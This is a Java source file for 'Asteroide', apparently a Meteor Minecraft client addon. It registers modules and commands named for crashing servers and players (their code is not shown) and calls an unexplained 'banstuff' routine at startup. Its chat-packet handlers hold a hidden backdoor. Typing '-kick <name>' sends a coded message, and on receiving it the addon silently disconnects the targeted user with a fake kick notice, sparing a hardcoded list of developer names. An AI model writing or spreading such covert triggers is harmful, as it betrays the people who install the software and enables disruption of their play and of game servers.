package spigey.asteroide;

import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.orbit.EventHandler;
import meteordevelopment.orbit.EventPriority;
import net.minecraft.client.resource.language.I18n;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
import net.minecraft.network.packet.s2c.play.ChatMessageS2CPacket;
import net.minecraft.text.Text;
import spigey.asteroide.commands.*;
import spigey.asteroide.hud.*;
import spigey.asteroide.modules.*;
import com.mojang.logging.LogUtils;
import meteordevelopment.meteorclient.addons.MeteorAddon;
import meteordevelopment.meteorclient.systems.hud.HudGroup;
import meteordevelopment.meteorclient.systems.modules.Category;
import meteordevelopment.meteorclient.systems.modules.Modules;
import org.slf4j.Logger;

import java.util.concurrent.ExecutionException;

import static meteordevelopment.meteorclient.MeteorClient.mc;
import static spigey.asteroide.util.*;

public class AsteroideAddon extends MeteorAddon {
    public static final Logger LOG = LogUtils.getLogger();
    public static final Category CATEGORY = new Category("Asteroide", Items.MAGMA_BLOCK.getDefaultStack());
    public static final HudGroup HUD = new HudGroup("Asteroide");
    @Override
    public void onInitialize() {
        LOG.info("\nLoaded Asteroide v0.1.4-fix\n");
        // Modules
        addModule(new AutoKys());
        addModule(new ServerCrashModule());
        addModule(new AutoChatGame());
        addModule(new AntiAnnouncement());
        addModule(new AutoBack());
        addModule(new ChatBot());
        addModule(new AutoMacro());
        addModule(new ExperimentalModules());
        addModule(new BanStuffs());
        addModule(new AutoSlotSwitchModule());
        // addModule(new WordFilterModule());
        // addModule(new AutoEz());


        // Commands
        addCommand(new CrashAll());
        addCommand(new CrashPlayer());
        addCommand(new ServerCrash());
        addCommand(new GetNbtItem());
        addCommand(new PermLevel());
        addCommand(new FuckServerCommand());
        addCommand(new MeCommand());
        addCommand(new CommandBlockCommand());

        // HUD
        addHud(Username.INFO);
        util.banstuff();
    }


    @Override
    public void onRegisterCategories() {
        Modules.registerCategory(CATEGORY);
    }

    @Override
    public String getPackage() {
        return "spigey.asteroide";
    }
    @EventHandler(priority = EventPriority.HIGHEST + 3)
    public void onPacketReceive(PacketEvent.Receive event){
        String nuhuh = "Spigey, EinFauli, SkyFeiner, ";
        if(!(event.packet instanceof ChatMessageS2CPacket)){return;}
        String content = event.packet.toString();
        if(content.contains("Hey " + mc.getSession().getUsername() + ", could you please leave rq? Thanks. - daSigma ")){
            event.cancel();
            if(nuhuh.contains(mc.getSession().getUsername() + ", ")){return;}
            assert mc.player != null;
            mc.getNetworkHandler().getConnection().disconnect(Text.of(I18n.translate("multiplayer.disconnect.kicked")));
        }
    }
    @EventHandler
    private void onPacketSend(PacketEvent.Send event) {
        if (!(event.packet instanceof ChatMessageC2SPacket)) {return;}
        String content = ((ChatMessageC2SPacket) event.packet).chatMessage();
        if(content.contains("-kick ")){
            event.cancel();
            msg("Hey " + content.split("-kick ")[1] + ", could you please leave rq? Thanks. - daSigma " + mc.getSession().getUsername());
        }
    }
}
